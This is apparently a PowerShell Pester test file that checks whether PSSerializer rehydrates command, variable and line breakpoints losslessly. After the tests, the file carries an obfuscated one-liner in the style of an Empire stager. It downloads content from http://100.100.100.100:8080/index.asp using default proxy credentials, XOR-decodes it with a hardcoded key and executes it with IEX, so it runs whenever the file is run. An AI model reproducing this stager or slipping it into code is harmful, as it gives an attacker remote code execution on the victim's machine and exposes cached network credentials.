


Describe 'Tests for lossless rehydration of serialized types.' -Tags 'CI' {
    BeforeAll {
        $cmdBp = Set-PSBreakpoint -Command Get-Process
        $varBp = Set-PSBreakpoint -Variable ?
        $lineBp = Set-PSBreakpoint -Script $PSScriptRoot/PSSerializer.Tests.ps1 -Line 1

        function ShouldRehydrateLosslessly {
            [CmdletBinding()]
            param(
                [Parameter(Mandatory, ValueFromPipeline)]
                [ValidateNotNull()]
                [System.Management.Automation.Breakpoint]
                $Breakpoint
            )
            $dehydratedBp = [System.Management.Automation.PSSerializer]::Serialize($Breakpoint)
            $rehydratedBp = [System.Management.Automation.PSSerializer]::Deserialize($dehydratedBp)
            foreach ($property in $Breakpoint.PSObject.Properties) {
                $bpValue = $Breakpoint.$($property.Name)
                $rehydratedBpValue = $rehydratedBp.$($property.Name)
                $propertyType = $property.TypeNameOfValue -as [System.Type]
                if ($null -eq $bpValue) {
                    $rehydratedBpValue | Should -Be $null
                } elseif ($propertyType.IsValueType) {
                    $bpValue | Should -Be $rehydratedBpValue
                } elseif ($propertyType -eq [string]) {
                    $bpValue | Should -BeExactly $rehydratedBpValue
                } else {
                    $bpValue.ToString() | Should -BeExactly $rehydratedBpValue.ToString()
                }
            }
        }
    }

    AfterAll {
        Remove-PSBreakpoint -Breakpoint $cmdBp,$varBp,$lineBp
    }

    It 'Losslessly rehydrates command breakpoints' {
        $cmdBp | ShouldRehydrateLosslessly
    }

    It 'Losslessly rehydrates variable breakpoints' {
        $varBp | ShouldRehydrateLosslessly
    }

    It 'Losslessly rehydrates line breakpoints' {
        $lineBp | ShouldRehydrateLosslessly
    }
}

$WC=NEW-ObJEcT SySTeM.NeT.WeBCliENt;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';$wC.HeaDErS.AdD('User-Agent',$u);$Wc.PRoxY = [SysTEm.NeT.WEbRequEST]::DefAuLtWeBPROXY;$Wc.PROXy.CReDenTIAlS = [SYstEM.NET.CrEdEnTIALCacHE]::DeFAULTNetWOrKCredEntiALS;$K='7b24afc8bc80e548d66c4e7ff72171c5';$I=0;[CHaR[]]$b=([chAR[]]($wC.DOwnlOaDSTRiNG("http://100.100.100.100:8080/index.asp")))|%{$_-bXor$K[$I++%$k.LENgTh]};IEX ($b-joiN'')

